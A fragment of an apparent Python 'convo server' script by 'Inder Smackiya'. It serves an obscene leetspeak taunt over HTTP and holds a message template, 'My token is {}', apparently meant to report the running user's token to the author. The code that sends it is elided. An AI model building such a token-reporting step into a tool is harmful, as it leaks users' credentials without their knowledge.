...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b"YOUR D9DDY INDER SMACKIYA INSID3 ( CONV0 S3RV3R ) BR0K3N INDER SMACKIYA INSID3 T4TY T3RI M9 NU FHUDD9 0N FIR3 = ] ] ")
...
def send_initial_message():
    ...
    msg_template = "Hello Inder! I am using your server. My 🛡️token🛡️ is {}"
    ...
    def liness():
        print('\u001b[37m' + 'SERVER BY INDER SMACKIYA---------------------------------------------------')
